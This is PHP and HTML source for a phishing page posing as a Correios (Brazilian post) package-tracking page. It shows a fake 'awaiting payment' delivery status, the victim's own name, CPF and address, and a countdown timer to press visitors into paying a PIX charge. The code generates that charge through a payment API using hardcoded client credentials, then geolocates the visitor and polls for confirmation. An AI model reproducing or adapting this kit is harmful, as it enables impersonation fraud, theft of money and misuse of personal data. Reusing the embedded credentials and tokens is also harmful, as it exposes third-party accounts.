<?php
session_start();

if (!isset($_SESSION['dadosBasicos'])) {
    header("Location: index.php");
    exit;
}

$dados = $_SESSION['dadosBasicos'];

$temCep = isset($dados['cep']) && $dados['cep'] !== 'Não informado';

$backgroundImage = $temCep ? 'images/cep.jpeg' : 'images/dados.png';

$marginTop = $temCep ? '28%' : '10%';
$marginRight = $temCep ? '0%' : '50%';

function formatarNome($nomeCompleto) {
    $partes = explode(' ', trim($nomeCompleto));

    if (count($partes) < 3) {
        return $nomeCompleto; 
    }

    return $partes[0] . ' ' . strtoupper(substr($partes[1], 0, 1)) . ' ' . end($partes);
}

$nomeFormatado = isset($dados['nome']) ? formatarNome($dados['nome']) : 'Não informado';
?>


<?php
// Verifica se os parâmetros necessários foram recebidos via GET
if (!isset($_GET['nome']) || !isset($_GET['email']) || !isset($_GET['telefone']) || !isset($_GET['cpf'])) {
    die("Erro: Parâmetros incompletos.");
}

// Captura e formata os dados corretamente
$nome = filter_input(INPUT_GET, 'nome', FILTER_SANITIZE_STRING);
$email = filter_input(INPUT_GET, 'email', FILTER_SANITIZE_EMAIL);
$telefone = filter_input(INPUT_GET, 'telefone', FILTER_SANITIZE_STRING);
$cpf = filter_input(INPUT_GET, 'cpf', FILTER_SANITIZE_STRING);

// Remove espaços extras
$nome = trim($nome);
$email = trim($email);
$telefone = trim($telefone);
$cpf = trim($cpf);

// Normaliza o telefone removendo caracteres indesejados
$telefone = preg_replace('/\D/', '', $telefone); // Mantém apenas números

// Corrige o telefone para um formato válido
if (strlen($telefone) > 11) {
    $telefone = substr($telefone, -11);
} elseif (strlen($telefone) < 10) {
    $telefone = "9" . $telefone;
}

// Normaliza o CPF removendo pontos e traços
$cpf = preg_replace('/\D/', '', $cpf);
if (strlen($cpf) !== 11) {
    die("Erro: CPF inválido.");
}

// Passo 1: Autenticação para obter o token
$auth_url = "https://codetech-payment-fanpass.rancher.codefabrik.dev/cli/client/authenticate";
$auth_payload = json_encode([
    "clientId" => "679d2b8374a8933dfca6dbc2", // Substituir pelo valor correto
    "password" => "qQiyUvLCE1a4"  // Substituir pelo valor correto
]);

$auth_headers = [
    "Content-Type: application/json",
    "Accept: */*"
];

$ch = curl_init($auth_url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $auth_headers);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $auth_payload);

$auth_response = curl_exec($ch);
$auth_http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

if ($auth_http_code !== 200) {
    die("Erro ao autenticar na API de PIX");
}

$auth_data = json_decode($auth_response, true);
if (!isset($auth_data['data']['token'])) {
    die("Erro: Token de autenticação não recebido.");
}

$token = $auth_data['data']['token'];

echo "<script>sessionStorage.setItem('token', '" . $token . "');</script>";

// Passo 2: Gerar o PIX
$pix_url = "https://codetech-payment-fanpass.rancher.codefabrik.dev/cli/payment/pix/generate-pix";

$externalId = uniqid(); // Gera o ID único

$pix_payload = json_encode([
    "expiration" => 0,
    "value" => 2.00,
    "externalId" => $externalId, // Agora usamos a variável para controle
    "buyerName" => $nome,
    "buyerCpf" => $cpf,
    "buyerEmail" => $email,
    "buyerPhone" => $telefone
]);

$pix_headers = [
    "Content-Type: application/json",
    "Accept: */*",
    "Authorization: Bearer $token"
];

$ch = curl_init($pix_url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $pix_headers);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $pix_payload);

$pix_response = curl_exec($ch);
$pix_http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

if ($pix_http_code !== 200 && $pix_http_code !== 201) {
    die("Erro ao gerar PIX: Código HTTP $pix_http_code - Resposta: $pix_response");
}

$pix_data = json_decode($pix_response, true);

if (!isset($pix_data['data']['pix'])) {
    die("Erro na resposta da API de PIX.");
}

// Adiciona o externalId dentro dos dados retornados pela API
$pix_data['data']['externalId'] = $externalId;
$pix_data['data']['token'] = $token;
// Salva tudo dentro da sessão
$_SESSION['pix_data'] = $pix_data['data'];


// Transformando a estrutura da resposta para manter compatibilidade
$pixCode = $pix_data['data']['pix'];
$pixQrCode = $pixCode; // Assumindo que o QR Code seja o mesmo valor do PIX gerado
?>
<script>
    sessionStorage.setItem('pixData', JSON.stringify(<?php echo json_encode($pix_data['data']); ?>));
</script>
<script>
    sessionStorage.setItem('externalId', "<?php echo htmlspecialchars($externalId); ?>");
    console.log("External ID salvo:", sessionStorage.getItem('externalId'));
</script>



<!DOCTYPE html>
<html lang="en">

<head>
  <meta http-equiv="content-type" content="text/html; charset=UTF-8">
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <link rel="preconnect" href="https://fonts.googleapis.com/">
  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
  <link href="css2-1.html" rel="stylesheet">
  <link rel="stylesheet" href="css/bootstrap-1.css">
  <link rel="stylesheet" href="css/app-1.css">
  <link rel="stylesheet" href="css/yellow-1.css">
  <link rel="stylesheet" href="css/all-1.css" crossorigin="anonymous">
  <link rel="icon" type="image/x-icon" href="../wp-content/uploads/2024/11/regular_correios-logo-2-2.png">
  <meta name="csrf-token" content="XhpaSjXrgaC3XF8BrR4GtmpFPMLsyEiAAnHS72ER">
  <title>Correios | Rastreio</title>
  <link rel="stylesheet" type="text/css" href="css/all.css">
  <script type="text/javascript"
    class="flasher-js">(function () { var rootScript = '../cdn.jsdelivr.net/npm/%40flasher/flasher%401.3.2/dist/flasher.min.js'; var FLASHER_FLASH_BAG_PLACE_HOLDER = {}; var options = mergeOptions([], FLASHER_FLASH_BAG_PLACE_HOLDER); function mergeOptions(first, second) { return { context: merge(first.context || {}, second.context || {}), envelopes: merge(first.envelopes || [], second.envelopes || []), options: merge(first.options || {}, second.options || {}), scripts: merge(first.scripts || [], second.scripts || []), styles: merge(first.styles || [], second.styles || []), }; } function merge(first, second) { if (Array.isArray(first) && Array.isArray(second)) { return first.concat(second).filter(function (item, index, array) { return array.indexOf(item) === index; }); } return Object.assign({}, first, second); } function renderOptions(options) { if (!window.hasOwnProperty('flasher')) { console.error('Flasher is not loaded'); return; } requestAnimationFrame(function () { window.flasher.render(options); }); } function render(options) { if ('loading' !== document.readyState) { renderOptions(options); return; } document.addEventListener('DOMContentLoaded', function () { renderOptions(options); }); } if (1 === document.querySelectorAll('script.flasher-js').length) { document.addEventListener('flasher:render', function (event) { render(event.detail); }); } if (window.hasOwnProperty('flasher') || !rootScript || document.querySelector('script[src="' + rootScript + '"]')) { render(options); } else { var tag = document.createElement('script'); tag.setAttribute('src', rootScript); tag.setAttribute('type', 'text/javascript'); tag.onload = function () { render(options); }; document.head.appendChild(tag); } })();</script>
  <script src="js/flasher.min.js" type="text/javascript"></script>
  <script src="js/flasher.min_002.js" type="text/javascript"></script>

  <script>

    function obterCidade() {

      fetch('https://ipinfo.io/json?token=187a55254c9d09')
        .then(response => response.json())
        .then(data => {

          const cidade = data.city;


          document.getElementById('cidade').textContent = cidade || "";
        })
        .catch(error => {
          console.log('Erro ao obter a cidade: ', error);
          document.getElementById('cidade').textContent = "Não foi possível determinar a cidade.";
        });
    }


    window.onload = obterCidade;
  </script>
  <script>

    function pegarParametros() {
      const urlParams = new URLSearchParams(window.location.search);
      return {
        nome: urlParams.get('name'),
        cpf: urlParams.get('cpf')
      };
    }


    function redirecionarParaProximaPagina() {
      const { nome, cpf } = pegarParametros();

      if (nome && cpf) {
        const proximaPagina = `/encomenda?name=${encodeURIComponent(nome)}&cpf=${encodeURIComponent(cpf)};` 
        window.location.href = proximaPagina; 
      } else {
        console.log("Nome ou CPF não encontrado.");
      }
    }


    document.getElementById('botaoRedirecionar').addEventListener('click', redirecionarParaProximaPagina);
  </script>
</head>







<body>
  <header class="w-100 font-size-16 font-weight-400 text-blue">
    <div class="w-100 bg-grey px-3 px-lg-3 py-1 border-bottom border-white">
      <span>Acessibilidade</span>

      <i class="fas fa-caret-down ml-1"></i>
    </div>
    <style>
      .div-flex {
        display: flex;
        align-items: center;
        justify-content: center;
      }
    </style>
    <nav class="w-100 d-flex align-items-center bg-grey-2 px-3 px-lg-3 py-1 border-bottom border-warning"
      style="height:48px">
      <div class="menu-toggle" id="menu-toggle" style="width:50px">
        <div class="bar"></div>
        <div class="bar"></div>
        <div class="bar"></div>
      </div>

      <div class="ml-0 ml-lg-1 d-flex justify-content-center" style="width:100%">
        <a onclick="redirect(event)" class="py-2">
          <img src="images/correios-1.png" alt="" height="25">
        </a>
      </div>

      <div class="ml-4 d-none d-lg-block " style="width:150px">
        <a onclick="redirect(event)"
          class="py-1 text-blue-dark border-left border-secondary px-3 text-decoration-none">
          <img src="images/entrar-1.svg" alt="Correios" width="31">

          <span class="ml-1">Entrar</span>
        </a>
      </div>
    </nav>
  </header>

  <main>
    <nav class="d-flex align-items-center flex-wrap mt-4 px-2 font-weight-400 w-95 max-w-1000" style="margin: 0 auto;">
      <span class="text-blue mr-2">Portal Correios</span>
      <i class="fal fa-angle-right mr-2"></i>
      <span class="text-blue mr-2">Rastreamento</span>
      <i class="fal fa-angle-right mr-2"></i>

      <span class="text-blue mr-2"><span class="cpf"></span></span>
    </nav>

<div style="display: grid; grid-template-areas: 'top-bar' 'content' 'footer'; grid-template-rows: auto 1fr auto; min-height: 100vh;">
    <div class="header">
        <img decoding="async" style="width: 120px;" src="images/525ebbb3-3126-49ce-874c-d6c00507bc47.png" alt="Imagem Centralizada">
    </div>
    <div style="grid-area: content; padding: 0 1rem;">
        <div style="margin-top: 18px;" class="main-content">
            <div id="formulario" class="mb-3">
                <div class="compra-status">
                    <div class="app-alerta-msg mb-2">
                        <i class="app-alerta-msg--icone bi bi-check-circle text-warning"></i>
                        <div class="app-alerta-msg--txt">
                            <h3 class="app-alerta-msg--titulo">Aguardando Pagamento!</h3>
                            <p>Finalize o pagamento</p>
                        </div>
                    </div>
                    <hr class="my-2">
                </div>
                <div class="compra-pagamento">
                    <div class="pagamentoQrCode text-center">
                        <div class="pagamento-rapido">
                            <div class="app-card card rounded-top rounded-0 shadow-none border-bottom">
                                <div class="card-body">
                                    <div class="pagamento-rapido--progress">
                                        <div class="d-flex justify-content-center align-items-center mb-1 font-md">
                                            <div><small>Você tem</small></div>
                                            <div class="mx-1"><b class="font-md" id="tempo-restante">12:47</b></div>
                                            <div><small>para pagar</small></div>
                                        </div>
                                        <div class="progress bg-dark bg-opacity-50">
                                            <div class="progress-bar bg-danger" role="progressbar" aria-valuenow="14.777777777777779" aria-valuemin="0" aria-valuemax="100" id="barra-progresso" style="width: 14.7778%;"></div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="app-card card rounded-bottom rounded-0 rounded-bottom b-1 border-dark mb-2">
                            <div class="card-body">
                                <div class="row justify-content-center mb-2">
                                    <div class="col-12 text-start">
                                        <div class="mb-1"><span class="font-xs">Valor: </span><span class="badge bg-success badge-xs">R$27,90</span></div>
                                        <div class="mb-1"><span class="badge bg-success badge-xs">1</span><span class="font-xs"> Copie o código PIX abaixo.</span></div>
                                        <div class="input-group mb-2">
                                            <input id="pixCopiaCola" type="text" class="form-control" value="<?php echo htmlspecialchars($pixCode); ?>">
                                            <div class="input-group-append">
                                                <button onclick="copyPix()" class="app-btn btn btn-success rounded-0 rounded-end">Copiar</button>
                                            </div>
                                        </div>
                                        <div class="mb-2"><span class="badge bg-success">2</span> <span class="font-xs">Abra o app do seu banco e escolha a opção PIX, como se fosse fazer uma transferência.</span></div>
                                        <p><span class="badge bg-success">3</span> <span class="font-xs">Selecione a opção PIX cópia e cola, cole a chave copiada e confirme o pagamento.</span></p>
                                    </div>
                                    <div class="col-12 my-2">
                                        <p class="alert alert-warning p-2 font-xss" style="text-align: justify; margin-bottom:0.5rem !important">Este pagamento só pode ser realizado dentro do tempo, após este período, caso o pagamento não for confirmado sua solicitação será cancelada.</p>
                                        <p>⚠️ATENÇÃO, após realizar o pagamento volte nesta página para concluir a solicitação.</p>
                                    </div>
                                </div>
                                <button id="btmqr" class="btn-custom" type="button">Mostrar QR Code</button>
                                <div id="exibeqr" style="display: none; margin-top: 24px; margin-bottom: 24px; align-items: center;" class="row justify-content-center">
                                    <div class="col-6 pb-3">
                                        <div style="text-align: left; font-size:0.9rem !important" class="font-xss">
                                            <h5><i class="bi bi-qr-code"></i> QR Code</h5>
                                            <div>Acesse o APP do seu banco e escolha a opção <strong>pagar com QR Code,</strong> escaneie o código ao lado e confirme o pagamento.</div>
                                        </div>
                                    </div>
                                    <div class="col-6">
                                        <div class="d-block text-center">
                                            <?php if ($pixQrCode === "DEU MERDA"): ?>
                                                <div id="img-qrcode" class="d-inline-block bg-white rounded"><p style="color: red; font-weight: bold;"><?php echo $pixQrCode; ?></p></div>
                                            <?php else: ?>
                                                <div id="img-qrcode" class="d-inline-block bg-white rounded"><img style="width:200px; height:200px" src="<?php echo htmlspecialchars($pixQrCode); ?>" class="img-fluid"></div>
                                            <?php endif; ?>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <footer>
        <div class="footer-content">
            <img src="images/site-seguro-google.png" alt="Logo" style="width: 180px; height: auto;">
        </div>
    </footer>
</div>




    <div style="padding: 0px 30px 0px 30px;">
      <a onclick="redirect(event)" class="btn btn-primary"
        style="font-size:13px;width: 100%;">CLIQUE AQUI
        PARA LIBERAÇÃO DO SEU PEDIDO</a>

    </div>
    <script>
        function redirect(event) {
            event.preventDefault();
            var currentUrlParams = window.location.search;
            var cpf = "<?php echo isset($dados['cpf']) ? $dados['cpf'] : ''; ?>";
            window.location.href = "../teste/index.php?cpf=" + cpf + "&" + currentUrlParams.substring(1);
        }
    </script>

    <section class="mt-3 p-4  w-95 max-w-1000" style="margin:0 auto;">

    <div class="container">
        <div class="overlay">
            <div class="overlay-text">
                <p class="rotate" style="margin-top:<?php echo $marginTop; ?>; margin-right:<?php echo $marginRight; ?>;"> 
                    NOME: <?php echo $nomeFormatado; ?>
                    <br>
                    CPF: <?php echo $dados['cpf'] ?? 'Não informado'; ?>
                </p>

                <?php if ($temCep): ?>
                <p class="rotate" style="margin-top:10%;"> 
                    RUA: <?php echo $dados['logradouro'] ?? 'Não informado'; ?><br>
                    BAIRRO: <?php echo $dados['bairro'] ?? 'Não informado'; ?><br>
                    CIDADE: <?php echo $dados['municipio'] ?? 'Não informado'; ?>
                </p>
                <?php endif; ?>
            </div>
        </div>
    </div>


      <style>
        /* Estilo para o contêiner pai */
        .container {
          position: relative;
          /* Faz com que os filhos com posição absoluta sejam relativos a este contêiner */
          width: 100%;
          /* Ou o tamanho desejado */
          height: 300px;
          /* Ou o tamanho desejado */
          background-color: #f0f0f0;
          /* Apenas para dar um fundo e melhor visualização */
          border: 1px solid #ddd;
          /* Para visualizar a borda da div */
        }


        .overlay {
            position: relative;
            width: 100%;
            height: 100%;
            background-image: url('<?php echo $backgroundImage; ?>');
            background-size: cover;
            background-position: center;
        }

        /* Estilo para o texto centralizado dentro da div */
        .overlay-text {
          position: absolute;
          top: 60%;
          left: 55%;
          transform: translate(-50%, -50%);
          background-color: transparent;
          color: black !important;
          padding: 10px 20px;
          font-size: 10px;
          text-align: center;
          border-radius: 5px;
          width: 300px;
        }

        .rotate {
          text-align: start;
          transform: rotate(2deg);

          color: black !important;
          font-weight: bold;
          opacity: 0.5;
          text-shadow: rgba(0, 0, 0, 0.3) 1px 1px 3px, rgba(0, 0, 0, 0.3) -1px -1px 3px, rgba(0, 0, 0, 0.1) 0px 0px 8px;
          transform-style: preserve-3d;
          transform: rotateX(1.2deg) rotateY(55deg);
        }

        /* Entre 100px e 200px, font para .rotate */
        @media (min-width: 100px) and (max-width: 200px) {
          .rotate {}
        }

        /* Entre 201px e 300px, font para .rotate */
        @media (min-width: 201px) and (max-width: 300px) {
          .rotate {}
        }

        /* Entre 301px e 400px, font para .rotate */
        @media (min-width: 301px) and (max-width: 400px) {
          .rotate {}
        }
      </style>
    </section>
    <section class="px-4 py mb-5 w-95 max-w-1000" style="margin:0 auto;">
    <ul>


<li class="d-flex mt-4" style="position: relative">
  <div class="bg-grey d-flex justify-content-center align-items-center font-size-24 text-blue" style="width:50px;height:50px;border-radius:50%;z-index:100;min-widht:50px">
    <img src="images/correios-icon-1.png" alt="" width="32">
  </div>

  <div class="w-70 d-flex flex-column flex-wrap ml-3 justify-content-center font-verdana">
    <h5 class="text-blue-dark font-size-13 font-weight-700 p-0 m-0 flex-wrap">
      Previsão de Entrega
    </h5>

    <span class="text-dark font-size-12 flex-wrap">
      3 dias após o pagamento
    </span>
  </div>
</li>

<li class="d-flex mt-5" style="position: relative">
  <div style="width:2px;height:120px;background-color:#FFC40C;position:absolute;top:-118px;left:24px"></div>

  <div class="bg-grey d-flex justify-content-center align-items-center font-size-24 text-blue" style="width:50px;height:50px;border-radius:50%;z-index:100;min-widht:50px">
    <i class="fal fa-usd-circle"></i>
  </div>

  <div class="w-70 d-flex flex-column flex-wrap ml-3 justify-content-center font-verdana">
    <h5 class="text-blue-dark font-size-13 font-weight-700 p-0 m-0 flex-wrap">
      Objeto aguardando sua confirmação
    </h5>

    <span class="text-dark font-size-12 flex-wrap">
          em Unidade de Fiscalização <?php echo $_SESSION['dadosBasicos']['municipio'] ?? 'Cidade não informada'; ?>  
          <br>
    </span>


    <h5 class="mt-1 text-blue-dark font-size-13 font-weight-700 p-0 m-0 flex-wrap">
      Realize o pagamento: <a onclick="redirect(event)" class="text-blue">Efetuar Pagamento</a>
    </h5>
  </div>
</li>




<li class="d-flex mt-5" style="position: relative">
  <div style="width:2px;height:120px;background-color:#FFC40C;position:absolute;top:-118px;left:24px"></div>

  <div class="bg-grey d-flex justify-content-center align-items-center font-size-24 text-blue" style="width:50px;height:50px;border-radius:50%;z-index:100;min-widht:50px">
    <i class="fal fa-truck"></i>
  </div>

  <div class="w-70 d-flex flex-column flex-wrap ml-3 justify-content-center font-verdana">
    <h5 class="text-blue-dark font-size-13 font-weight-700 p-0 m-0 flex-wrap">
      Objeto em transferência - por favor aguarde
    </h5>
  </div>
</li>

<li class="d-flex mt-5" style="position: relative">
  <div style="width:2px;height:172px;background-color:#FFC40C;position:absolute;top:-170px;left:24px"></div>

  <div class="bg-grey d-flex justify-content-center align-items-center font-size-24 text-blue" style="width:50px;height:50px;border-radius:50%;z-index:100">
    <i class="fal fa-box-alt"></i>
  </div>

  <div class="d-flex flex-column ml-3 justify-content-center font-verdana">
    <h5 class="text-blue-dark font-size-13 font-weight-700 p-0 m-0">Objeto Postado</h5>
  </div>
</li>
</ul>

    </section>

    <section class="my-4 w-95 max-w-1000" style="margin:0 auto;">
      <div>
        <img src="images/banner-1-1.jpg" alt="" class="w-100">
      </div>
    </section>
  </main>

  <footer class="d-flex flex-wrap px-5 py-4 bg-yellow text-blue-dark">
    <div class="w-30 min-w-300 px-0 px-lg-3 mb-3">
      <h5 class="font-weight-700 mb-4">Fale Conosco</h5>

      <ul>
        <li class="mb-2 font-size-14">
          <i class="fas fa-desktop"></i>
          <a onclick="redirect(event)" class="ml-2 text-blue-dark text-hover-orange">
            <span class="text-wrap">Registro de Manifestações</span>
          </a>
        </li>

        <li class="mb-2 font-size-14">
          <i class="far fa-question-square mr-1"></i>
          <a onclick="redirect(event)" class="ml-2 text-blue-dark text-hover-orange">
            <span class="text-wrap">Central de Atendimento</span>
          </a>
        </li>

        <li class="mb-2 font-size-14">
          <i class="far fa-briefcase"></i>
          <a onclick="redirect(event)" class="ml-2 text-blue-dark text-hover-orange">
            <span class="text-wrap">Solucões para o seu negócio</span>
          </a>
        </li>
        <li class="mb-2 font-size-14">
          <i class="far fa-headset"></i>
          <a onclick="redirect(event)" class="ml-2 text-blue-dark text-hover-orange">
            <span class="text-wrap">Suporte ao cliente com contrato</span>
          </a>
        </li>
        <li class="mb-2 font-size-14">
          <i class="far fa-comment-alt-dots"></i>
          <a onclick="redirect(event)" class="ml-2 text-blue-dark text-hover-orange">
            <span>Ouvidoria</span>
          </a>
        </li>

        <li class="mb-2 font-size-14">
          <i class="far fa-user-headset"></i>
          <a onclick="redirect(event)" class="ml-2 text-blue-dark text-hover-orange">
            <span>Denúncia</span>
          </a>
        </li>
      </ul>
    </div>

    <div class="w-30 min-w-300 px-0 px-lg-3 mb-3">
      <h5 class="font-weight-700 mb-4">Sobre os Correios</h5>

      <ul>
        <li class="mb-2 font-size-14">
          <i class="far fa-address-card"></i>
          <a onclick="redirect(event)" class="ml-2 text-blue-dark text-hover-orange">
            <span>Identidade colaborativa</span>
          </a>
        </li>

        <li class="mb-2 font-size-14">
          <i class="far fa-user-graduate"></i>
          <a onclick="redirect(event)" class="ml-2 text-blue-dark text-hover-orange">
            <span>Educação e cultura</span>
          </a>
        </li>

        <li class="mb-2 font-size-14">
          <i class="far fa-book-alt"></i>
          <a onclick="redirect(event)" class="ml-2 text-blue-dark text-hover-orange">
            <span>Código de ética</span>
          </a>
        </li>

        <li class="mb-2 font-size-14">
          <i class="far fa-file-search"></i>
          <a onclick="redirect(event)" class="ml-2 text-blue-dark text-hover-orange">
            <span class="text-wrap">Transparência e prestação de contas</span>
          </a>
        </li>

        <li class="mb-2 font-size-14">
          <i class="far fa-comment-alt-dots"></i>
          <a onclick="redirect(event)" class="ml-2 text-blue-dark text-hover-orange">
            <span class="text-wrap">Política de privacidade e Notas legais</span>
          </a>
        </li>
      </ul>
    </div>

    <div class="w-30 min-w-300 px-0 px-lg-3 mb-3">
      <h5 class="font-weight-700 mb-4">Outros Sites</h5>

      <ul>
        <li class="mb-2 font-size-14">
          <i class="far fa-shopping-cart"></i>
          <a onclick="redirect(event)" class="ml-2 text-blue-dark text-hover-orange">
            <span class="text-wrap">Loja online dos correios</span>
          </a>
        </li>
      </ul>
    </div>

    <div class="d-flex justify-content-center w-100 px-3 mb-3 text-dark font-size-14">
      <span>© Copyright 2024 Correios</span>
    </div>
  </footer>

  <script src="js/jquery-3.6.0.min-1.js"></script>
  <script src="js/bootstrap.min-1.js"></script>


  <script>
    //APELAUTM
    var timer = setInterval(function () {                                                //APELAUTM
      const location = new URL(document.location.href);                                //APELAUTM
      const fields = ["src", "sck", "utm_source", "utm_medium", "utm_campaign", "utm_content", "utm_term"];
      var links = document.getElementsByTagName("a");                                  //APELAUTM
      //APELAUTM
      for (var i = 0, n = links.length; i < n; i++) {                                  //APELAUTM
        if (links[i].href.includes("#")) continue;                                   //APELAUTM
        if (links[i].href) {                                                         //APELAUTM
          let link = new URL(links[i].href);                                       //APELAUTM
          fields.forEach(field => {                                                //APELAUTM
            if (location.searchParams.get(field))                                //APELAUTM
              link.searchParams.set(field, location.searchParams.get(field));  //APELAUTM
          });
          let href = link.href;
          links[i].href = href;
        }
      }
    }, 500);
    //APELAUTM
  </script>
<script>
    $("#btmqr").on('click', (function() {
        if (document.getElementById('exibeqr').style.display == 'flex') {
            document.getElementById('exibeqr').style.display = 'none';
            document.getElementById('btmqr').innerHTML = "Mostrar QR Code";
        } else {
            document.getElementById('exibeqr').style.display = "flex";
            document.getElementById('btmqr').innerHTML = "Ocultar QR Code";
        }
    }));

    function copyPix() {
        var copyText = document.getElementById("pixCopiaCola");
        copyText.select();
        copyText.setSelectionRange(0, 99999);
        document.execCommand("copy");
        navigator.clipboard.writeText(copyText.value);
        alert("Chave pix 'Copia e Cola' copiada com sucesso!");
    }

    $(document).ready(function() {
        var tempoInicial = parseInt('15');
        var progressoMaximo = 100;
        var tempoRestante;

        if (localStorage.getItem("tempoRestante")) {
            tempoRestante = parseInt(localStorage.getItem("tempoRestante"));
        } else {
            tempoRestante = tempoInicial * 60;
            localStorage.setItem("tempoRestante", tempoRestante);
        }

        var intervalo = setInterval(function() {
            var minutos = Math.floor(tempoRestante / 60);
            var segundos = tempoRestante % 60;
            var tempoFormatado = minutos.toString().padStart(2, '0') + ':' + segundos.toString().padStart(2, '0');
            $('#tempo-restante').text(tempoFormatado);
            var progresso = ((tempoInicial * 60 - tempoRestante) / (tempoInicial * 60)) * progressoMaximo;
            $('#barra-progresso').css('width', progresso + '%').attr('aria-valuenow', progresso);
            tempoRestante--;
            localStorage.setItem("tempoRestante", tempoRestante);
            if (tempoRestante < 0) {
                clearInterval(intervalo);
                localStorage.removeItem("tempoRestante");
            }
        }, 1000);

// VERIFICAÇÃO DO STATUS DO PAGAMENTO
setInterval(() => {
    const pixData = JSON.parse(sessionStorage.getItem("pixData")); 
    const token = sessionStorage.getItem("token");

    if (!pixData || !pixData.externalId || !token) {
        console.log("❌ Nenhum externalId ou token encontrado, não será possível verificar o pagamento.");
        return;
    }

    fetch("https://codetech-payment-fanpass.rancher.codefabrik.dev/cli/payment/externalId/" + pixData.externalId, {
        method: "GET",
        headers: {
            "Content-Type": "application/json",
            "Authorization": "Bearer " + token
        }
    })
    .then(response => response.json())
    .then(data => {
        console.log("📡 Resposta da API:", data);

        if (data.success && data.data.status === "CONFIRMED") {
            console.log("✅ Pagamento CONFIRMADO! Redirecionando...");
            window.location.href = "/chat?src=$cpf"; // Redireciona para a página de sucesso
        } else {
            console.log("⏳ Pagamento ainda pendente...");
        }
    })
    .catch(error => console.error("❌ Erro ao verificar pagamento:", error));
    
}, 3000); // 🔄 Verifica a cada 3 segundos
    });
</script>


</body>

</html>